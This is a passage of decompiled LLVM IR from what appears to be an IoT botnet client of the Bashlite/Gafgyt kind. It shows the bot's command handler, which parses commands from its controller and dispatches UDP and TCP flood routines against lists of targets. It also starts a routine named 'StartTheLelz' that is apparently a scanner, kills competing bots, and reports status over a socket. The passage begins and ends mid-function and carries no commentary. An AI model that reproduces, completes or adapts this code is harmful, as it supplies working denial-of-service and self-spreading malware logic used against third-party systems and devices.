  %v9_104cc = load i32, i32* @r6, align 4
  %v12_104cc = load i32, i32* @r7, align 4
  %v15_104cc = load i32, i32* @r8, align 4
  %v18_104cc = load i32, i32* @fp, align 4
  store i32 66772, i32* %stack_var_-4, align 4
  %v2_104d0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_104d0, i32* @fp, align 4
  %v2_104e4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b1ec.56 to i32), i32* @r1, align 4
  %v3_104f0 = inttoptr i32 %v2_104e4 to i8*
  %v4_104f0 = call i32 @__GI_strcoll(i8* %v3_104f0, i32 ptrtoint ([5 x i8]* @global_var_1b1ec.56 to i32))
  %v2_104f8 = icmp eq i32 %v4_104f0, 0
  br i1 %v2_104f8, label %dec_label_pc_10500, label %dec_label_pc_10518

dec_label_pc_10500:                               ; preds = %entry
  %v2_10504 = load i32, i32* @global_var_265cc.54, align 4
  %v3_10510 = call i32 @sockprintf(i32 %v2_10504, i32 ptrtoint ([6 x i8]* @global_var_1c358.708 to i32))
  br label %dec_label_pc_112a8

dec_label_pc_10518:                               ; preds = %entry
  %v2_1051c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1c360.710 to i32), i32* @r1, align 4
  %v3_10528 = inttoptr i32 %v2_1051c to i8*
  %v4_10528 = call i32 @__GI_strcoll(i8* %v3_10528, i32 ptrtoint ([6 x i8]* @global_var_1c360.710 to i32))
  %v2_10530 = icmp eq i32 %v4_10528, 0
  br i1 %v2_10530, label %dec_label_pc_10538, label %dec_label_pc_1055c

dec_label_pc_10538:                               ; preds = %dec_label_pc_10518
  %v2_1053c = load i32, i32* @global_var_265cc.54, align 4
  store i32 %v2_1053c, i32* @r4, align 4
  %v0_10540 = call i32 @getdtablesize()
  %v0_10548 = load i32, i32* @r4, align 4
  store i32 %v0_10540, i32* @r2, align 4
  %v3_10554 = call i32 @sockprintf(i32 %v0_10548, i32 ptrtoint ([3 x i8]* @global_var_1c368.712 to i32))
  br label %dec_label_pc_112a8

dec_label_pc_1055c:                               ; preds = %dec_label_pc_10518
  %v2_10560 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1c36c.714 to i32), i32* @r1, align 4
  %v3_1056c = inttoptr i32 %v2_10560 to i8*
  %v4_1056c = call i32 @__GI_strcoll(i8* %v3_1056c, i32 ptrtoint ([8 x i8]* @global_var_1c36c.714 to i32))
  %v2_10574 = icmp eq i32 %v4_1056c, 0
  br i1 %v2_10574, label %dec_label_pc_1057c, label %dec_label_pc_10698

dec_label_pc_1057c:                               ; preds = %dec_label_pc_1055c
  %v1_10580 = add i32 %tmp, 4
  %v1_10584 = inttoptr i32 %v1_10580 to i32*
  %v2_10584 = load i32, i32* %v1_10584, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1c374.716 to i32), i32* @r1, align 4
  %v3_10590 = inttoptr i32 %v2_10584 to i8*
  %v4_10590 = call i32 @__GI_strcoll(i8* %v3_10590, i32 ptrtoint ([4 x i8]* @global_var_1c374.716 to i32))
  %v2_10598 = icmp eq i32 %v4_10590, 0
  br i1 %v2_10598, label %dec_label_pc_105a0, label %dec_label_pc_105e4

dec_label_pc_105a0:                               ; preds = %dec_label_pc_1057c
  %v2_105a4 = load i32, i32* @global_var_2c850.718, align 4
  %v2_105a8 = icmp eq i32 %v2_105a4, 0
  br i1 %v2_105a8, label %dec_label_pc_112a8, label %dec_label_pc_105b0

dec_label_pc_105b0:                               ; preds = %dec_label_pc_105a0
  %v0_105c0 = call i32 @kill()
  %v2_105c8 = load i32, i32* @global_var_265cc.54, align 4
  %v3_105d4 = call i32 @sockprintf(i32 %v2_105c8, i32 ptrtoint ([17 x i8]* @global_var_1c378.720 to i32))
  store i32 0, i32* @global_var_2c850.718, align 4
  br label %dec_label_pc_105e4

dec_label_pc_105e4:                               ; preds = %dec_label_pc_1057c, %dec_label_pc_105b0
  %v2_105ec = load i32, i32* %v1_10584, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1c38c.722 to i32), i32* @r1, align 4
  %v3_105f8 = inttoptr i32 %v2_105ec to i8*
  %v4_105f8 = call i32 @__GI_strcoll(i8* %v3_105f8, i32 ptrtoint ([3 x i8]* @global_var_1c38c.722 to i32))
  %v2_10600 = icmp eq i32 %v4_105f8, 0
  br i1 %v2_10600, label %dec_label_pc_10608, label %dec_label_pc_10698

dec_label_pc_10608:                               ; preds = %dec_label_pc_105e4
  %v2_1060c = load i32, i32* @global_var_2c850.718, align 4
  %v2_10610 = icmp eq i32 %v2_1060c, 0
  br i1 %v2_10610, label %dec_label_pc_10618, label %dec_label_pc_112a8

dec_label_pc_10618:                               ; preds = %dec_label_pc_10608
  %v0_10618 = call i32 @__libc_fork()
  %v2_10638 = icmp eq i32 %v0_10618, 0
  br i1 %v2_10638, label %dec_label_pc_1065c, label %dec_label_pc_10640

dec_label_pc_10640:                               ; preds = %dec_label_pc_10618
  store i32 %v0_10618, i32* @global_var_2c850.718, align 4
  br label %dec_label_pc_112a8

dec_label_pc_1065c:                               ; preds = %dec_label_pc_10618
  %v2_10660 = load i32, i32* @global_var_265cc.54, align 4
  store i32 %v2_10660, i32* @r4, align 4
  %v2_10668 = load i32, i32* @global_var_2c848.477, align 4
  store i32 %v2_10668, i32* @r0, align 4
  %v1_1066c = inttoptr i32 %v2_10668 to i32*
  %v2_1066c = call i32 @__GI_inet_ntoa(i32* %v1_1066c)
  %v0_10674 = load i32, i32* @r4, align 4
  store i32 %v2_1066c, i32* @r2, align 4
  %v3_10680 = call i32 @sockprintf(i32 %v0_10674, i32 ptrtoint ([26 x i8]* @global_var_1c390.725 to i32))
  %v2_1068c = call i32 @StartTheLelz(i32 10, i32 1000)
  %v1_10694 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_10698:                               ; preds = %dec_label_pc_105e4, %dec_label_pc_1055c
  %v2_1069c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1c3ac.727 to i32), i32* @r1, align 4
  %v3_106a8 = inttoptr i32 %v2_1069c to i8*
  %v4_106a8 = call i32 @__GI_strcoll(i8* %v3_106a8, i32 ptrtoint ([8 x i8]* @global_var_1c3ac.727 to i32))
  %v2_106b0 = icmp eq i32 %v4_106a8, 0
  br i1 %v2_106b0, label %dec_label_pc_106b8, label %dec_label_pc_106fc

dec_label_pc_106b8:                               ; preds = %dec_label_pc_10698
  %v0_106b8 = call i32 @listFork()
  %v2_106c0 = icmp eq i32 %v0_106b8, 0
  br i1 %v2_106c0, label %dec_label_pc_106c8, label %dec_label_pc_106fc

dec_label_pc_106c8:                               ; preds = %dec_label_pc_106b8
  %v2_106cc = load i32, i32* @global_var_265cc.54, align 4
  store i32 %v2_106cc, i32* @r4, align 4
  %v2_106d4 = load i32, i32* @global_var_2c848.477, align 4
  store i32 %v2_106d4, i32* @r0, align 4
  %v1_106d8 = inttoptr i32 %v2_106d4 to i32*
  %v2_106d8 = call i32 @__GI_inet_ntoa(i32* %v1_106d8)
  %v0_106e0 = load i32, i32* @r4, align 4
  store i32 %v2_106d8, i32* @r2, align 4
  %v3_106ec = call i32 @sockprintf(i32 %v0_106e0, i32 ptrtoint ([29 x i8]* @global_var_1c3b4.729 to i32))
  %v1_106f0 = call i32 @botkiller(i32 %v3_106ec)
  %v1_106f8 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_106fc:                               ; preds = %dec_label_pc_106b8, %dec_label_pc_10698
  %v2_10700 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_1c3d4.731 to i32), i32* @r1, align 4
  %v3_1070c = inttoptr i32 %v2_10700 to i8*
  %v4_1070c = call i32 @__GI_strcoll(i8* %v3_1070c, i32 ptrtoint ([12 x i8]* @global_var_1c3d4.731 to i32))
  %v2_10714 = icmp eq i32 %v4_1070c, 0
  br i1 %v2_10714, label %dec_label_pc_1071c, label %dec_label_pc_10748

dec_label_pc_1071c:                               ; preds = %dec_label_pc_106fc
  %v2_10720 = load i32, i32* @global_var_265cc.54, align 4
  store i32 %v2_10720, i32* @r4, align 4
  %v2_10728 = load i32, i32* @global_var_2c848.477, align 4
  store i32 %v2_10728, i32* @r0, align 4
  %v1_1072c = inttoptr i32 %v2_10728 to i32*
  %v2_1072c = call i32 @__GI_inet_ntoa(i32* %v1_1072c)
  %v0_10734 = load i32, i32* @r4, align 4
  store i32 %v2_1072c, i32* @r2, align 4
  %v3_10740 = call i32 @sockprintf(i32 %v0_10734, i32 ptrtoint ([17 x i8]* @global_var_1c3e0.733 to i32))
  br label %dec_label_pc_112a8

dec_label_pc_10748:                               ; preds = %dec_label_pc_106fc
  %v2_1074c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1c3f4.735 to i32), i32* @r1, align 4
  %v3_10758 = inttoptr i32 %v2_1074c to i8*
  %v4_10758 = call i32 @__GI_strcoll(i8* %v3_10758, i32 ptrtoint ([4 x i8]* @global_var_1c3f4.735 to i32))
  %v2_10760 = icmp eq i32 %v4_10758, 0
  br i1 %v2_10760, label %dec_label_pc_10768, label %dec_label_pc_10ac8

dec_label_pc_10768:                               ; preds = %dec_label_pc_10748
  %v7_10770 = icmp slt i32 %arg1, 6
  br i1 %v7_10770, label %dec_label_pc_10888, label %dec_label_pc_10774

dec_label_pc_10774:                               ; preds = %dec_label_pc_10768
  %v1_10778 = add i32 %tmp, 12
  %v1_1077c = inttoptr i32 %v1_10778 to i32*
  %v2_1077c = load i32, i32* %v1_1077c, align 4
  store i32 %v2_1077c, i32* @r0, align 4
  %v1_10784 = call i32 @atol(i32 %v2_1077c)
  %v7_1078c = icmp eq i32 %v1_10784, -1
  br i1 %v7_1078c, label %dec_label_pc_10888, label %dec_label_pc_10794

dec_label_pc_10794:                               ; preds = %dec_label_pc_10774
  %v1_10798 = add i32 %tmp, 8
  %v1_1079c = inttoptr i32 %v1_10798 to i32*
  %v2_1079c = load i32, i32* %v1_1079c, align 4
  store i32 %v2_1079c, i32* @r0, align 4
  %v1_107a4 = call i32 @atol(i32 %v2_1079c)
  %v7_107ac = icmp eq i32 %v1_107a4, -1
  br i1 %v7_107ac, label %dec_label_pc_10888, label %dec_label_pc_107b4

dec_label_pc_107b4:                               ; preds = %dec_label_pc_10794
  %v1_107b8 = add i32 %tmp, 16
  %v1_107bc = inttoptr i32 %v1_107b8 to i32*
  %v2_107bc = load i32, i32* %v1_107bc, align 4
  store i32 %v2_107bc, i32* @r0, align 4
  %v1_107c4 = call i32 @atol(i32 %v2_107bc)
  %v7_107cc = icmp eq i32 %v1_107c4, -1
  br i1 %v7_107cc, label %dec_label_pc_10888, label %dec_label_pc_107d4

dec_label_pc_107d4:                               ; preds = %dec_label_pc_107b4
  %v1_107d8 = add i32 %tmp, 20
  %v1_107dc = inttoptr i32 %v1_107d8 to i32*
  %v2_107dc = load i32, i32* %v1_107dc, align 4
  store i32 %v2_107dc, i32* @r0, align 4
  %v1_107e4 = call i32 @atol(i32 %v2_107dc)
  %v7_107ec = icmp eq i32 %v1_107e4, -1
  br i1 %v7_107ec, label %dec_label_pc_10888, label %dec_label_pc_107f4

dec_label_pc_107f4:                               ; preds = %dec_label_pc_107d4
  %v2_107fc = load i32, i32* %v1_107dc, align 4
  store i32 %v2_107fc, i32* @r0, align 4
  %v1_10804 = call i32 @atol(i32 %v2_107fc)
  %v8_10810 = icmp sgt i32 %v1_10804, 65536
  br i1 %v8_10810, label %dec_label_pc_10888, label %dec_label_pc_10814

dec_label_pc_10814:                               ; preds = %dec_label_pc_107f4
  %v2_1081c = load i32, i32* %v1_107dc, align 4
  store i32 %v2_1081c, i32* @r0, align 4
  %v1_10824 = call i32 @atol(i32 %v2_1081c)
  store i32 %v1_10824, i32* @r2, align 4
  %v8_10838 = icmp sgt i32 %v1_10824, 65500
  br i1 %v8_10838, label %dec_label_pc_10888, label %dec_label_pc_1083c

dec_label_pc_1083c:                               ; preds = %dec_label_pc_10814
  %v2_10844 = load i32, i32* %v1_107bc, align 4
  store i32 %v2_10844, i32* @r0, align 4
  %v1_1084c = call i32 @atol(i32 %v2_10844)
  %v8_10858 = icmp sgt i32 %v1_1084c, 32
  br i1 %v8_10858, label %dec_label_pc_10888, label %dec_label_pc_1085c

dec_label_pc_1085c:                               ; preds = %dec_label_pc_1083c
  %v7_10860 = icmp eq i32 %arg1, 7
  br i1 %v7_10860, label %dec_label_pc_10868, label %dec_label_pc_108a0

dec_label_pc_10868:                               ; preds = %dec_label_pc_1085c
  %v1_1086c = add i32 %tmp, 24
  %v1_10870 = inttoptr i32 %v1_1086c to i32*
  %v2_10870 = load i32, i32* %v1_10870, align 4
  store i32 %v2_10870, i32* @r0, align 4
  %v1_10878 = call i32 @atol(i32 %v2_10870)
  %v5_10884 = icmp sgt i32 %v1_10878, 0
  br i1 %v5_10884, label %dec_label_pc_108a0, label %dec_label_pc_10888

dec_label_pc_10888:                               ; preds = %dec_label_pc_10868, %dec_label_pc_1083c, %dec_label_pc_10814, %dec_label_pc_107f4, %dec_label_pc_107d4, %dec_label_pc_107b4, %dec_label_pc_10794, %dec_label_pc_10774, %dec_label_pc_10768
  %v2_1088c = load i32, i32* @global_var_265cc.54, align 4
  %v3_10898 = call i32 @sockprintf(i32 %v2_1088c, i32 ptrtoint ([113 x i8]* @global_var_1c3f8.737 to i32))
  br label %dec_label_pc_112a8

dec_label_pc_108a0:                               ; preds = %dec_label_pc_1085c, %dec_label_pc_10868
  %v1_108a4 = add i32 %tmp, 4
  %v1_108a8 = inttoptr i32 %v1_108a4 to i32*
  %v2_108a8 = load i32, i32* %v1_108a8, align 4
  %v2_108b8 = load i32, i32* %v1_1079c, align 4
  store i32 %v2_108b8, i32* @r0, align 4
  %v1_108c0 = call i32 @atol(i32 %v2_108b8)
  %v2_108d4 = load i32, i32* %v1_1077c, align 4
  store i32 %v2_108d4, i32* @r0, align 4
  %v1_108dc = call i32 @atol(i32 %v2_108d4)
  %v2_108f0 = load i32, i32* %v1_107bc, align 4
  store i32 %v2_108f0, i32* @r0, align 4
  %v1_108f8 = call i32 @atol(i32 %v2_108f0)
  %v2_1090c = load i32, i32* %v1_107dc, align 4
  store i32 %v2_1090c, i32* @r0, align 4
  %v1_10914 = call i32 @atol(i32 %v2_1090c)
  %v7_10928 = icmp slt i32 %arg1, 7
  br i1 %v7_10928, label %dec_label_pc_10948, label %dec_label_pc_1092c

dec_label_pc_1092c:                               ; preds = %dec_label_pc_108a0
  %v1_10930 = add i32 %tmp, 24
  %v1_10934 = inttoptr i32 %v1_10930 to i32*
  %v2_10934 = load i32, i32* %v1_10934, align 4
  store i32 %v2_10934, i32* @r0, align 4
  %v1_1093c = call i32 @atol(i32 %v2_10934)
  br label %dec_label_pc_10950

dec_label_pc_10948:                               ; preds = %dec_label_pc_108a0
  br label %dec_label_pc_10950

dec_label_pc_10950:                               ; preds = %dec_label_pc_1092c, %dec_label_pc_10948
  %storemerge9 = phi i32 [ 1000, %dec_label_pc_10948 ], [ %v1_1093c, %dec_label_pc_1092c ]
  %v7_10960 = icmp slt i32 %arg1, 8
  br i1 %v7_10960, label %dec_label_pc_10980, label %dec_label_pc_10964

dec_label_pc_10964:                               ; preds = %dec_label_pc_10950
  %v1_10968 = add i32 %tmp, 28
  %v1_1096c = inttoptr i32 %v1_10968 to i32*
  %v2_1096c = load i32, i32* %v1_1096c, align 4
  store i32 %v2_1096c, i32* @r0, align 4
  %v1_10974 = call i32 @atol(i32 %v2_1096c)
  br label %dec_label_pc_10994

dec_label_pc_10980:                               ; preds = %dec_label_pc_10950
  br label %dec_label_pc_10994

dec_label_pc_10994:                               ; preds = %dec_label_pc_10964, %dec_label_pc_10980
  %storemerge8 = phi i32 [ 1000000, %dec_label_pc_10980 ], [ %v1_10974, %dec_label_pc_10964 ]
  %v7_109a4 = icmp slt i32 %arg1, 9
  br i1 %v7_109a4, label %dec_label_pc_109c4, label %dec_label_pc_109a8

dec_label_pc_109a8:                               ; preds = %dec_label_pc_10994
  %v1_109ac = add i32 %tmp, 32
  %v1_109b0 = inttoptr i32 %v1_109ac to i32*
  %v2_109b0 = load i32, i32* %v1_109b0, align 4
  store i32 %v2_109b0, i32* @r0, align 4
  %v1_109b8 = call i32 @atol(i32 %v2_109b0)
  br label %dec_label_pc_109cc

dec_label_pc_109c4:                               ; preds = %dec_label_pc_10994
  br label %dec_label_pc_109cc

dec_label_pc_109cc:                               ; preds = %dec_label_pc_109a8, %dec_label_pc_109c4
  %storemerge7 = phi i32 [ 0, %dec_label_pc_109c4 ], [ %v1_109b8, %dec_label_pc_109a8 ]
  %v2_109e0 = call i32 @__GI_strchr(i32 %v2_108a8, i32 44)
  %v2_109e8 = icmp eq i32 %v2_109e0, 0
  br i1 %v2_109e8, label %dec_label_pc_10a7c, label %dec_label_pc_109f0

dec_label_pc_109f0:                               ; preds = %dec_label_pc_109cc
  store i32 %v2_108a8, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c064.567 to i32), i32* @r1, align 4
  %v2_109fc = call i32 @__GI_strtok(i32 %v2_108a8, i32 ptrtoint (i32* @global_var_1c064.567 to i32))
  %v2_10a7023 = icmp eq i32 %v2_109fc, 0
  br i1 %v2_10a7023, label %dec_label_pc_112a8, label %dec_label_pc_10a0c

dec_label_pc_10a0c:                               ; preds = %dec_label_pc_109f0, %dec_label_pc_10a58
  %storemerge1824 = phi i32 [ %v2_10a60, %dec_label_pc_10a58 ], [ %v2_109fc, %dec_label_pc_109f0 ]
  %v0_10a0c = call i32 @listFork()
  %v2_10a14 = icmp eq i32 %v0_10a0c, 0
  br i1 %v2_10a14, label %dec_label_pc_10a1c, label %dec_label_pc_10a58

dec_label_pc_10a1c:                               ; preds = %dec_label_pc_10a0c
  %v8_10a4c = call i32 @sendUDP(i32 %storemerge1824, i32 %v1_108c0, i32 %v1_108dc, i32 %v1_108f8, i32 %v1_10914, i32 %storemerge9, i32 %storemerge8, i32 %storemerge7)
  %v1_10a54 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_10a58:                               ; preds = %dec_label_pc_10a0c
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c064.567 to i32), i32* @r1, align 4
  %v2_10a60 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1c064.567 to i32))
  %v2_10a70 = icmp eq i32 %v2_10a60, 0
  br i1 %v2_10a70, label %dec_label_pc_112a8, label %dec_label_pc_10a0c

dec_label_pc_10a7c:                               ; preds = %dec_label_pc_109cc
  %v0_10a7c = call i32 @listFork()
  %v2_10a84 = icmp eq i32 %v0_10a7c, 0
  br i1 %v2_10a84, label %dec_label_pc_10a8c, label %dec_label_pc_112a8

dec_label_pc_10a8c:                               ; preds = %dec_label_pc_10a7c
  %v8_10abc = call i32 @sendUDP(i32 %v2_108a8, i32 %v1_108c0, i32 %v1_108dc, i32 %v1_108f8, i32 %v1_10914, i32 %storemerge9, i32 %storemerge8, i32 %storemerge7)
  %v1_10ac4 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_10ac8:                               ; preds = %dec_label_pc_10748
  %v2_10acc = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1c46c.740 to i32), i32* @r1, align 4
  %v3_10ad8 = inttoptr i32 %v2_10acc to i8*
  %v4_10ad8 = call i32 @__GI_strcoll(i8* %v3_10ad8, i32 ptrtoint ([4 x i8]* @global_var_1c46c.740 to i32))
  %v2_10ae0 = icmp eq i32 %v4_10ad8, 0
  br i1 %v2_10ae0, label %dec_label_pc_10ae8, label %dec_label_pc_10dac

dec_label_pc_10ae8:                               ; preds = %dec_label_pc_10ac8
  %v7_10af0 = icmp slt i32 %arg1, 6
  br i1 %v7_10af0, label %dec_label_pc_10bcc, label %dec_label_pc_10af4

dec_label_pc_10af4:                               ; preds = %dec_label_pc_10ae8
  %v1_10af8 = add i32 %tmp, 12
  %v1_10afc = inttoptr i32 %v1_10af8 to i32*
  %v2_10afc = load i32, i32* %v1_10afc, align 4
  store i32 %v2_10afc, i32* @r0, align 4
  %v1_10b04 = call i32 @atol(i32 %v2_10afc)
  %v7_10b0c = icmp eq i32 %v1_10b04, -1
  br i1 %v7_10b0c, label %dec_label_pc_10bcc, label %dec_label_pc_10b14

dec_label_pc_10b14:                               ; preds = %dec_label_pc_10af4
  %v1_10b18 = add i32 %tmp, 8
  %v1_10b1c = inttoptr i32 %v1_10b18 to i32*
  %v2_10b1c = load i32, i32* %v1_10b1c, align 4
  store i32 %v2_10b1c, i32* @r0, align 4
  %v1_10b24 = call i32 @atol(i32 %v2_10b1c)
  %v7_10b2c = icmp eq i32 %v1_10b24, -1
  br i1 %v7_10b2c, label %dec_label_pc_10bcc, label %dec_label_pc_10b34

dec_label_pc_10b34:                               ; preds = %dec_label_pc_10b14
  %v1_10b38 = add i32 %tmp, 16
  %v1_10b3c = inttoptr i32 %v1_10b38 to i32*
  %v2_10b3c = load i32, i32* %v1_10b3c, align 4
  store i32 %v2_10b3c, i32* @r0, align 4
  %v1_10b44 = call i32 @atol(i32 %v2_10b3c)
  %v7_10b4c = icmp eq i32 %v1_10b44, -1
  br i1 %v7_10b4c, label %dec_label_pc_10bcc, label %dec_label_pc_10b54

dec_label_pc_10b54:                               ; preds = %dec_label_pc_10b34
  %v2_10b5c = load i32, i32* %v1_10b3c, align 4
  store i32 %v2_10b5c, i32* @r0, align 4
  %v1_10b64 = call i32 @atol(i32 %v2_10b5c)
  %v8_10b70 = icmp sgt i32 %v1_10b64, 32
  br i1 %v8_10b70, label %dec_label_pc_10bcc, label %dec_label_pc_10b74

dec_label_pc_10b74:                               ; preds = %dec_label_pc_10b54
  %v7_10b7c = icmp slt i32 %arg1, 7
  br i1 %v7_10b7c, label %dec_label_pc_10ba0, label %dec_label_pc_10b80

dec_label_pc_10b80:                               ; preds = %dec_label_pc_10b74
  %v1_10b84 = add i32 %tmp, 24
  %v1_10b88 = inttoptr i32 %v1_10b84 to i32*
  %v2_10b88 = load i32, i32* %v1_10b88, align 4
  store i32 %v2_10b88, i32* @r0, align 4
  %v1_10b90 = call i32 @atol(i32 %v2_10b88)
  %v1_10b98 = icmp slt i32 %v1_10b90, 0
  br i1 %v1_10b98, label %dec_label_pc_10bcc, label %dec_label_pc_10ba0

dec_label_pc_10ba0:                               ; preds = %dec_label_pc_10b80, %dec_label_pc_10b74
  %v7_10ba4 = icmp eq i32 %arg1, 8
  br i1 %v7_10ba4, label %dec_label_pc_10bac, label %dec_label_pc_10be4

dec_label_pc_10bac:                               ; preds = %dec_label_pc_10ba0
  %v1_10bb0 = add i32 %tmp, 28
  %v1_10bb4 = inttoptr i32 %v1_10bb0 to i32*
  %v2_10bb4 = load i32, i32* %v1_10bb4, align 4
  store i32 %v2_10bb4, i32* @r0, align 4
  %v1_10bbc = call i32 @atol(i32 %v2_10bb4)
  %v5_10bc8 = icmp sgt i32 %v1_10bbc, 0
  br i1 %v5_10bc8, label %dec_label_pc_10be4, label %dec_label_pc_10bcc

dec_label_pc_10bcc:                               ; preds = %dec_label_pc_10bac, %dec_label_pc_10b80, %dec_label_pc_10b54, %dec_label_pc_10b34, %dec_label_pc_10b14, %dec_label_pc_10af4, %dec_label_pc_10ae8
  %v2_10bd0 = load i32, i32* @global_var_265cc.54, align 4
  %v3_10bdc = call i32 @sockprintf(i32 %v2_10bd0, i32 ptrtoint ([186 x i8]* @global_var_1c470.742 to i32))
  br label %dec_label_pc_112a8

dec_label_pc_10be4:                               ; preds = %dec_label_pc_10ba0, %dec_label_pc_10bac
  %v1_10be8 = add i32 %tmp, 4
  %v1_10bec = inttoptr i32 %v1_10be8 to i32*
  %v2_10bec = load i32, i32* %v1_10bec, align 4
  %v2_10bfc = load i32, i32* %v1_10b1c, align 4
  store i32 %v2_10bfc, i32* @r0, align 4
  %v1_10c04 = call i32 @atol(i32 %v2_10bfc)
  %v2_10c18 = load i32, i32* %v1_10afc, align 4
  store i32 %v2_10c18, i32* @r0, align 4
  %v1_10c20 = call i32 @atol(i32 %v2_10c18)
  %v2_10c34 = load i32, i32* %v1_10b3c, align 4
  store i32 %v2_10c34, i32* @r0, align 4
  %v1_10c3c = call i32 @atol(i32 %v2_10c34)
  %v1_10c4c = add i32 %tmp, 20
  %v1_10c50 = inttoptr i32 %v1_10c4c to i32*
  %v2_10c50 = load i32, i32* %v1_10c50, align 4
  br i1 %v7_10ba4, label %dec_label_pc_10c64, label %dec_label_pc_10c80

dec_label_pc_10c64:                               ; preds = %dec_label_pc_10be4
  %v1_10c68 = add i32 %tmp, 28
  %v1_10c6c = inttoptr i32 %v1_10c68 to i32*
  %v2_10c6c = load i32, i32* %v1_10c6c, align 4
  store i32 %v2_10c6c, i32* @r0, align 4
  %v1_10c74 = call i32 @atol(i32 %v2_10c6c)
  br label %dec_label_pc_10c88

dec_label_pc_10c80:                               ; preds = %dec_label_pc_10be4
  br label %dec_label_pc_10c88

dec_label_pc_10c88:                               ; preds = %dec_label_pc_10c64, %dec_label_pc_10c80
  %storemerge6 = phi i32 [ 10, %dec_label_pc_10c80 ], [ %v1_10c74, %dec_label_pc_10c64 ]
  br i1 %v7_10b7c, label %dec_label_pc_10cb8, label %dec_label_pc_10c9c

dec_label_pc_10c9c:                               ; preds = %dec_label_pc_10c88
  %v1_10ca0 = add i32 %tmp, 24
  %v1_10ca4 = inttoptr i32 %v1_10ca0 to i32*
  %v2_10ca4 = load i32, i32* %v1_10ca4, align 4
  store i32 %v2_10ca4, i32* @r0, align 4
  %v1_10cac = call i32 @atol(i32 %v2_10ca4)
  br label %dec_label_pc_10cc0

dec_label_pc_10cb8:                               ; preds = %dec_label_pc_10c88
  br label %dec_label_pc_10cc0

dec_label_pc_10cc0:                               ; preds = %dec_label_pc_10c9c, %dec_label_pc_10cb8
  %storemerge5 = phi i32 [ 0, %dec_label_pc_10cb8 ], [ %v1_10cac, %dec_label_pc_10c9c ]
  %v2_10cd4 = call i32 @__GI_strchr(i32 %v2_10bec, i32 44)
  %v2_10cdc = icmp eq i32 %v2_10cd4, 0
  br i1 %v2_10cdc, label %dec_label_pc_10d68, label %dec_label_pc_10ce4

dec_label_pc_10ce4:                               ; preds = %dec_label_pc_10cc0
  store i32 %v2_10bec, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c064.567 to i32), i32* @r1, align 4
  %v2_10cf0 = call i32 @__GI_strtok(i32 %v2_10bec, i32 ptrtoint (i32* @global_var_1c064.567 to i32))
  %v2_10d5c31 = icmp eq i32 %v2_10cf0, 0
  br i1 %v2_10d5c31, label %dec_label_pc_10dac, label %dec_label_pc_10d00

dec_label_pc_10d00:                               ; preds = %dec_label_pc_10ce4, %dec_label_pc_10d44
  %storemerge1632 = phi i32 [ %v2_10d4c, %dec_label_pc_10d44 ], [ %v2_10cf0, %dec_label_pc_10ce4 ]
  %v0_10d00 = call i32 @listFork()
  %v2_10d08 = icmp eq i32 %v0_10d00, 0
  br i1 %v2_10d08, label %dec_label_pc_10d10, label %dec_label_pc_10d44

dec_label_pc_10d10:                               ; preds = %dec_label_pc_10d00
  %v7_10d38 = call i32 @sendTCP(i32 %storemerge1632, i32 %v1_10c04, i32 %v1_10c20, i32 %v1_10c3c, i32 %v2_10c50, i32 %storemerge5, i32 %storemerge6)
  %v1_10d40 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_10d44:                               ; preds = %dec_label_pc_10d00
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c064.567 to i32), i32* @r1, align 4
  %v2_10d4c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1c064.567 to i32))
  %v2_10d5c = icmp eq i32 %v2_10d4c, 0
  br i1 %v2_10d5c, label %dec_label_pc_10dac, label %dec_label_pc_10d00

dec_label_pc_10d68:                               ; preds = %dec_label_pc_10cc0
  %v0_10d68 = call i32 @listFork()
  %v2_10d70 = icmp eq i32 %v0_10d68, 0
  br i1 %v2_10d70, label %dec_label_pc_10d78, label %dec_label_pc_10dac

dec_label_pc_10d78:                               ; preds = %dec_label_pc_10d68
  %v7_10da0 = call i32 @sendTCP(i32 %v2_10bec, i32 %v1_10c04, i32 %v1_10c20, i32 %v1_10c3c, i32 %v2_10c50, i32 %storemerge5, i32 %storemerge6)
  %v1_10da8 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_10dac:                               ; preds = %dec_label_pc_10d44, %dec_label_pc_10ce4, %dec_label_pc_10d68, %dec_label_pc_10ac8
  %v2_10db0 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1c52c.744 to i32), i32* @r1, align 4
  %v3_10dbc = inttoptr i32 %v2_10db0 to i8*
  %v4_10dbc = call i32 @__GI_strcoll(i8* %v3_10dbc, i32 ptrtoint ([5 x i8]* @global_var_1c52c.744 to i32))
  %v2_10dc4 = icmp eq i32 %v4_10dbc, 0
  br i1 %v2_10dc4, label %dec_label_pc_10dcc, label %dec_label_pc_10fb4

dec_label_pc_10dcc:                               ; preds = %dec_label_pc_10dac
  %v7_10dd4 = icmp slt i32 %arg1, 6
  br i1 %v7_10dd4, label %dec_label_pc_112a8, label %dec_label_pc_10dd8

dec_label_pc_10dd8:                               ; preds = %dec_label_pc_10dcc
  %v1_10ddc = add i32 %tmp, 4
  %v1_10de0 = inttoptr i32 %v1_10ddc to i32*
  %v2_10de0 = load i32, i32* %v1_10de0, align 4
  %v2_10dec = call i32 @__GI_strchr(i32 %v2_10de0, i32 44)
  %v2_10df4 = icmp eq i32 %v2_10dec, 0
  br i1 %v2_10df4, label %dec_label_pc_10efc, label %dec_label_pc_10dfc
